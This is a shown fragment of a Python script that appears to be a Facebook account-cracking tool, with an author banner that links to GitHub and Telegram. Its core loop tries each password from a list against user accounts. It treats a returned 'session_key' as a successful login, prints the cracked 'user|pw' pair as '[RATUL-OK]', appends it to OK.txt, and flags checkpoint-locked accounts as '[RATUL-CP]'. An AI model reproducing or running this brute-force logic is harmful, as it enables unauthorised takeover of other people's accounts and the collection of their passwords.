...
def banner():
	...
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %sRATUL                    %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : https://github.com/Ratul00111/rx  %s║"%(Z,B,Z))
	print("%s║%s  Telegram : https://t.me/@ratulr_x        %s║"%(Z,B,Z))
	...
	try:
		for pw in pwx:
			...
			if "session_key" in result:
				print('\033[1;32m [RATUL-OK] '+user+'|'+pw+'\033[0;97m')
				open('OK.txt', 'a').write(user+'|'+pw+'\n')
				oks.append(user)
				break
			elif "www.facebook.com" in result["error_msg"]:
				print(result)
				print('\033[1;31m [RATUL-CP] '+user+'|'+pw+'\033[0;97m')
